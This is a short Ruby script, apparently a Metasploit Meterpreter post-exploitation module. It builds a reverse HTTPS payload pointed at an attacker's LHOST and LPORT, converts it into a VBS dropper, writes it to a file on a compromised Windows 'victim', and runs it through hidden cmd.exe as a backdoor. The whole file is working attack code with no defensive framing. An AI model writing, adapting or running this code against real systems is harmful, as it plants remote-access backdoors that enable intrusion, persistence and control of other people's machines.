def execute_cmd cmd_string, client
  client.sys.process.execute("cmd.exe /c #{cmd_string}", nil, {'Hidden' => 'true'})
end

def vbs_reverse_https path_to_backdoor, client
    execute_cmd "wscript #{path_to_backdoor}", client
end

def exe_reverse_https path_to_backdoor, client
    execute_cmd path_to_backdoor, client
end

def generate_payload payload_type, lhost, lport, client
  payload = payload_type
  pay = client.framework.payloads.create(payload)
  pay.datastore['LHOST'] = lhost
  pay.datastore['LPORT'] = lport
  return pay.generate
end

def write_payload payload, dir, client
  script =::Msf::Util::EXE.to_win32pe_vbs(client.framework, payload)
  write_script_to_victim script, dir, client
end

def write_script_to_victim script, dir, client
  file = client.fs.file.new(dir, "wb")
  file.write(script)
  file.close
end
